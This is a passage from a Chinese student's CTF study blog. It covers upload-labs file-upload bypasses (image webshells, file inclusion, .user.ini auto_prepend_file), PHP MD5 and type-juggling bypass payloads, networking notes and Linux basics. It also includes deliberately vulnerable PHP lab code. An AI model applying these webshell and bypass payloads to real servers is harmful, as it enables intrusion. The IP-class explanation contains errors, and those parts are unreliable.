class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此先介绍一下文件头相关内容:</p><p>图片格式往往不是根据文件后缀名去做判断的。文件头是文件开头的一段二进制，不同的图片类型，文件头是不同的。文件头又称文件幻数。</p><p>常见文件幻数</p><ul><li><p>JPG: FF D8 FF EO 00 10 4A 46 49 46.</p></li><li><p>GIF:47 49 46 3839 61(GIF89a).</p></li><li><p>PNG:89 50 4E 47</p></li></ul><hr><p>那么对于上面这道题或者使用getimagesize()函数读取图片信息(必须有真实的图片内容),我们可以尝试使用图片马绕过:</p><p>先介绍下生成图片马的方法</p><ol><li><p>在路径下准备好一句话木马.php和一张图片 .png (或者 .jpg )</p></li><li><p>输入系统指令： copy 一张图片.png&#x2F;b+一句话木马.php&#x2F;a 生成图片名称.png</p></li></ol><p>  这样图片木马就合成好了</p><p>我们利用服务器将木马文件解析成了图片文件，但因此向其发送执行该文件的请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。</p><p>接下来如何使这样的图片马生效呢</p><p>那么当然可以传之前介绍过的.htaccess文件,但是如果此文件不能上传,我们就可以选择使用<strong>文件包含</strong>漏洞来使其生效</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html:charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(_file_);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以构造url为:</p><p><code>http://xxx/include.php?file=upload/图片名称.png</code></p><h4 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h4><p>例如对于upload-labs第五题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题对后缀过滤非常严格,但是没过滤.ini且提示后台存在一个php文件,这样我们就可以用.user.ini绕过</p><p>因为想要引发 .user.ini 解析漏洞需要三个前提条件</p><ol><li><p>服务器脚本语言为PHP  </p></li><li><p>服务器使用CGI／FastCGI模式  </p></li><li><p>上传目录下要有可执行的php文件</p></li></ol><p>而正好这道题后台存在一个php文件</p><p>那么我们写一个这样的.user.ini文件并上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = ytm666.jpg</span><br></pre></td></tr></table></figure><p>.user.ini文件里的意思是：所有的php文件都自动包含ytm666.jpg文件。.user.ini相当于一个用户自定义的php.ini</p><p>那么我们传入一个一句话木马并改后缀为jpg的文件,就可以通过.user.ini文件,利用后台存在的php文件使这个.jpg的shell文件直接执行</p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记1</title>
      <link href="/2023/10/14/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-14-%E7%AC%94%E8%AE%B01/"/>
      <url>/2023/10/14/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-14-%E7%AC%94%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<h2 id="笔记1"><a href="#笔记1" class="headerlink" title="笔记1"></a>笔记1</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>不同的数据类型只区别于占据的内存空间,而不同的占据空间会影响在计算机内开辟的内存区域,作为计算机,通过读取不同内存部分的地址来使用数据</p><p>而数据类型,就如同服务员来敲开不同门牌号(地址)的房间(内存)来拿取数据,不同的数据类型也就对应着不同数量的服务员</p><p>对于不同的数据传输,计算机和计算机,计算机和人之间如何”交流”,是通过人为规定的编码与数据对应的表来进行数据传输,从最早的ASCII表到如今的utf-8编码,一切存在世界上的文字与字符甚至表情、语言或是图片,都有对应规定的计算机编码格式,从而转换为二进制使计算机进行存储或传输数据</p><h3 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/9b0e259a058e1e338ab3e50e728a2156.png" alt="1"></p><p>类似于商家，快递公司，快递员，小区，买家，小区的围栏可代表小区的容量,商家包快递和买家拆快递是种逆过程</p><p><strong>细分</strong></p><ul><li><p>快递气柱&amp;包装：顶层协议封装</p></li><li><p>快递面单：底层协议封装</p></li><li><p>快递员：互联网</p></li><li><p>小区：局域网（可浅理解计算机自带围栏）</p></li><li><p>小区大门&amp;保安闸机：路由器&#x2F;网关&amp;访问策略（可浅理解为规则，eg：新疆不发）</p></li><li><p>小区围栏：防火墙（可浅理解阻止从内到外或者从外到内）</p></li><li><p>小区容量：子网掩码</p></li><li><p>单元号：IP地址&amp;Mac地址（IPv4地址32位 IPv6地址128位 Mac地址48位 Mac地址为物理地址，IP也是层级关系）</p></li><li><p>门牌号：端口号(进程)</p></li><li><p>拆快递：解封装（即逆过程）</p></li><li><p>快递验收：数据校验（最底层校验）</p></li></ul><hr><p>补充</p><ul><li><p>路由器：所有上网设备都有IP地址，而路由器有公网地址</p></li><li><p>光猫：由光纤来，电信号到光信号转换，光信号到电信号的转换</p></li><li><p>DHCP：注册的过程，帮助新入网络节点获得局域网IP地址</p></li><li><p>DNS：解决IP地址与网址的关系，即所有IP在这里都有对应的网址</p></li></ul><h4 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h4><p>ip地址是32位，每个字节8位，实质我们的划分就是简单的哪几个字节是网络标识，哪个是主机标识，a类就是第一个字节作为网络标识，后三个字节是主机表示。它的范围是0.0.0.0-127.0.0.0。b类前两个是网络表识别。它的范围是128.0.0.1-191.255.0.0。c类前三个是网络标识。它的范围是192.168.0.0-239.255.255.0。同理可得最后d类就是四个字节是网络标识。</p><p>还有一点就是需要注意一点，那就是表示主机地址时，不可以全为0或者全为1。全为0只有在表示对应的网络地址或IP地址不可知的情况下才使用。而全为1的主机地址一般作为广播地址。所以上面abc三类的主机地址上限算的时候都会减2。</p><h4 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h4><p>子网掩码是一个32位地址，这是一种与ip地址结合使用的技术。他有两个主要功能。一个是屏蔽ip地址的一部分，以区分网络id和主机id，并指示ip地址实在局域网上还是在远程网络上。第二个功能是将大型ip网络划分为若干个小型子网</p><p>子网的使用其实是为了减少IP的浪费，我们创建了许多网络，但有很多ip地址并没有用完，因此必须划分子网，以提高网络应用程序的效率。</p><p>在实际使用中，子网掩码是不能单独存在的，他必须结合ip地址一起使用。简单说的话，他就是用来分割子网和区分哪些ip是同一个网段的，哪些不是</p><p>比如ip地址：192.168.1.1 子网掩码：255.255.255.0</p><h3 id="计算机思维"><a href="#计算机思维" class="headerlink" title="计算机思维"></a>计算机思维</h3><p>问题分解与抽象化：计算思维鼓励将复杂问题分解成更小的、可管理的部分，同时抽象问题的关键方面。这有助于更好地理解问题的本质，使问题更容易解决。</p><p>算法设计：计算思维强调开发明确的、可执行的步骤序列，用于解决各种问题。这些步骤被称为算法，它们应该具有清晰的逻辑和正确性，以及高效性。</p><p>数据处理和分析：计算思维包括了处理和分析数据的能力，这包括数据的采集、整理、存储、分析和可视化。数据在许多领域中都是重要的资源。</p><p>模型建立：计算思维通常涉及将数学模型应用于现实世界问题。这些模型可以用来描述和解释现象，然后使用计算机进行模拟和分析。</p><p>计算机科学概念：计算思维需要了解计算机科学的基本概念，如数据结构、算法复杂性、编程语言等。这有助于更好地理解计算机工作的原理。创新和解决问题：计算思维培养了创新和解决问题的能力。它鼓励人们寻找新的方法来解决各种挑战，包括工程、科学研究、商业和社会问题。</p><p>封装思维&amp;封层思维<br>封装：互联网络思想的精髓 人穿衣服 无需考虑数据含义即可完成通讯过程；无须考虑用户输入数据，即可完成数据交互 作用：帮助从全局视角看问题，提升通用性。<br>分量：化复杂整体为简单个体 TCP&#x2F;IP 人类历史的演进过程其实就是分层的过程，更加高效地解决专业问题 作用：解决复杂问题的最简单有效的方法</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周记1-MD5,初级绕过,Liunx基本,php反序列化</title>
      <link href="/2023/10/07/%E5%91%A8%E8%AE%B0-2023-10-7-%E5%91%A8%E8%AE%B01/"/>
      <url>/2023/10/07/%E5%91%A8%E8%AE%B0-2023-10-7-%E5%91%A8%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<h2 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h2><p>例如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>;</span><br></pre></td></tr></table></figure><p>对于这样的问题,传入的password值为多少才能使代码成立呢<br>这种就可以考虑写一个简单的Python脚本来实现md5弱碰撞(因为md5不可反向解码,实际是需要一个个试出来答案的),可以先从数字试起</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack</span>(<span class="params">pre</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">999999</span>):</span><br><span class="line">       <span class="keyword">if</span> (hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&quot;UTF-8&quot;</span>)).hexdigest())[<span class="number">0</span>:<span class="number">6</span>] == <span class="built_in">str</span>(pre):</span><br><span class="line">           <span class="built_in">print</span>(i)</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">crack(<span class="string">&quot;c4d038&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行后发现得出结果为114514</p><h2 id="php的一些初级绕过"><a href="#php的一些初级绕过" class="headerlink" title="php的一些初级绕过"></a>php的一些初级绕过</h2><h3 id="md5弱类型绕过"><a href="#md5弱类型绕过" class="headerlink" title="md5弱类型绕过"></a>md5弱类型绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)</span><br></pre></td></tr></table></figure><p>例如对于这样的a和b,我们可以选择传入数组绕过,但如果不允许传数组,可以选择找出两个数再md5加密后都为0e开头的即可(这样会被识别为科学记数法进而都得0)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br></pre></td></tr></table></figure><p>所以构造a&#x3D;QNKCDZO&amp;b&#x3D;s878926199a即可绕过</p><h3 id="is-numeric-和intval-绕过"><a href="#is-numeric-和intval-绕过" class="headerlink" title="is_numeric()和intval()绕过"></a>is_numeric()和intval()绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span></span><br></pre></td></tr></table></figure><p>例如这样的key5,我们可以选择传数组利用php中数组类型比整形大的特点绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> != <span class="number">1024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$c</span>) == <span class="number">1024</span></span><br></pre></td></tr></table></figure><p>但对于这样的题里面的c就不能传数组,因为要求intval($c)等于一个整数,那么我们可以选择构造c&#x3D;1024.5a这样的payload(利用此函数舍弃小数点部分的特性)</p><p>也可以选择传入一个0x开头的字符串,因为php中intval()函数中如果字符串包括了 “0x” (或 “0X”) 的前缀,使用 16 进制 (hex)</p><h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>)</span><br></pre></td></tr></table></figure><p>对于这样简单的黑名单过滤,可以选择参数逃逸绕过,构造这样的payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]));&amp;a=/flag</span><br></pre></td></tr></table></figure><p>其中的var_dump()是为了让网页回显</p><p>此外还可以使用变量拼接的方法</p><h3 id="strcmp-绕过"><a href="#strcmp-绕过" class="headerlink" title="strcmp()绕过"></a>strcmp()绕过</h3><p>此函数无法比较数组可以考虑传数组绕过</p><h2 id="Liunx常用命令"><a href="#Liunx常用命令" class="headerlink" title="Liunx常用命令"></a>Liunx常用命令</h2><h3 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h3><p><strong>1</strong>.<br>ls命令是列出目录内容的意思（List Directtory Contents）。运行它就是列出文件夹的内容，可能是文件也可能是文件夹。</p><p>  ls -l命令以详情模式(long listing fashion)列出文件夹的内容。</p><p>  ls &#x2F;命令列出目录下的所有文件</p><p>  ls -a命令会列出文件夹里的所有内容，包括以”.”开头的隐藏文件。</p><p>  注意：在Linux中，文件以“.”开头就是隐藏文件，并且每个文件，文件夹，设备或者命令都是以文件对待。<br><strong>2</strong>.<br>pwd 显示工作路径<br><strong>3</strong>.<br>cd &#x2F;home 进入 ‘&#x2F; home’ 目录’<br>cd … 返回上一级目录<br>cd …&#x2F;… 返回上两级目录<br>cd 进入个人的主目录<br>cd ~user1 进入个人的主目录<br>cd - 返回上次所在的目录</p><h3 id="文件显示命令"><a href="#文件显示命令" class="headerlink" title="文件显示命令"></a>文件显示命令</h3><p><strong>1</strong>.<br>less：显示文件内容带分页；<br><strong>2</strong>.<br>  grep：在文件中查询内容，grep –n “查找内容” 文件名；</p><p>  | [管道命令]：在linux和unix系统中 | 就是管道命令，把上一个命令的结果交给 | 的后面的命令进行处理。</p><p>  例：grep –n “查找内容” 文件名 | more<br><strong>3</strong>.<br>  cat：把文件串连接后输出到屏幕或加 &gt; fileName 到另一个档案。<br><strong>4</strong>.<br>  head：格式：head [-n|c num]fileName，说明：显示文件头部内容。没有参数时，显示最前10行。<br><strong>5</strong>.<br>  tail：格式：tail [-n|c num]fileName，说明：显示文件尾部内容。没有参数时，显示最后10行。<br><strong>6</strong>.<br>  cut：格式：cut -cnum1-num2 filename，说明：显示每行从开头算起第 num1 到 num2 的字符。</p><h2 id="Liunx基础"><a href="#Liunx基础" class="headerlink" title="Liunx基础"></a>Liunx基础</h2><h3 id="二级目录"><a href="#二级目录" class="headerlink" title="二级目录"></a>二级目录</h3><p>&#x2F;bin</p><p>放置的是在单人维护模式下还能够被操作的指令，在&#x2F;bin目录的指令可以被root与一般账号所使用<br>&#x2F;boot</p><p>这个目录主要放置开机会用到的文件，包括linux核心文件以及开机选单与开机所需配置文件等。<br>&#x2F;dev</p><p>在Linux系统上，任何装置与设备的接口设备都是以文件的形态存在于这个目录当中的。<br>&#x2F;etc</p><p>系统的主要配置文件几乎都是放置在这个目录下，列如账号密码文件，各种服务的启始党等。<br>&#x2F;home</p><p>这是系统默认的用户家目录<br>&#x2F;lib</p><p>库文件目录<br>&#x2F;media</p><p>&#x2F;media目录底下放置的是可移除的装置，包括软盘光盘等<br>&#x2F;opt</p><p>给第三方协力软件放置的目录。<br>&#x2F;root</p><p>系统管理员的家目录<br>&#x2F;sbin</p><p>为开机过程所需要的，里面包括了开机，修复，还原系统所需要的指令。<br>&#x2F;srv</p><p>srv可以视为service的缩写，是一些网络服务启动之后，这些服务所需要取用的数据目录。</p><h3 id="三级目录"><a href="#三级目录" class="headerlink" title="三级目录"></a>三级目录</h3><p>&#x2F;usr&#x2F;lib<br>包含各应用软件的函式库、目标文件(object file)，以及不被一般使用者惯用的执行档或脚本(script)。</p><p>&#x2F;usr&#x2F;local<br>系统管理员在本机自行安装自己下载的软件(ldistribution默认提供者)，建议安装到此目录，这样会比较便于管理。</p><p>&#x2F;var&#x2F;lib<br>程序本身执行的过程中，需要使用到的数据文件放置的目录</p><p>&#x2F;var&#x2F;log(重要)<br>登录文件放置的目录,里面比较重要的文件如&#x2F;var&#x2F;log&#x2F;messages,&#x2F;var&#x2F;log&#x2F;wtmp(记录登入者的信息)等。</p><p>&#x2F;etc&#x2F;init.d&#x2F;<br>所有服务的预设启动 script 都是放在这里的</p><p>&#x2F;etc&#x2F;passwd</p><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><p>这个博客写的还不错<a href="https://blog.csdn.net/Hardworking666/article/details/122373938">https://blog.csdn.net/Hardworking666/article/details/122373938</a><br>再推荐一下这个视频里类和对象讲的很清楚(当复习一遍了)<a href="https://www.bilibili.com/video/BV1TH4y1U7tJ?p=5&amp;vd_source=aa13d69224a955c223f4998b491b80fb">https://www.bilibili.com/video/BV1TH4y1U7tJ?p=5&amp;vd_source=aa13d69224a955c223f4998b491b80fb</a></p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar CTF web1</title>
      <link href="/2023/09/27/NewStar-CTF-2023-9-27-NewStar-CTF-web1/"/>
      <url>/2023/09/27/NewStar-CTF-2023-9-27-NewStar-CTF-web1/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStar-CTF-web-第一周writeup"><a href="#NewStar-CTF-web-第一周writeup" class="headerlink" title="NewStar CTF web 第一周writeup"></a>NewStar CTF web 第一周writeup</h1><h2 id="泄露的秘密"><a href="#泄露的秘密" class="headerlink" title="泄露的秘密"></a>泄露的秘密</h2><p><img src="https://s2.loli.net/2023/10/01/oXic4WZ8fhR1Q7N.png" alt="1"><br>根据题目和网页的提示,认定这是一道藏有敏感文件的题,第一时间我想到的是爆破路径,但是很不巧,我没安dirseach,自己的路径扫描工具还出了问题..<br>我就打算尝试几个可能藏有敏感文件的路径,发现&#x2F;robots.txt里有一部分flag<br><img src="https://s2.loli.net/2023/10/01/yuxcONY3pQviMIZ.png" alt="1"><br>好,但是只出来了这一半,果不其然的卡关了,但是在刚才的尝试中发现了一个&#x2F;index.php路径有点特殊,据我发现网页是存在这个路径的但是显示不出来这个文件,所以通过网上的搜索,终于发现一种能下出敏感文件的路径&#x2F;<a href="http://www.zip/">www.zip</a><br><img src="https://s2.loli.net/2023/10/01/q3aXopFiYd1vLyn.png" alt="1"><br><img src="https://s2.loli.net/2023/10/01/BysdUGORo8APwI9.png" alt="1"><br>好好好还真藏在这里了,这下另一半flag也找到了,拼接一下提交这样就成功拿下第一道了</p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" 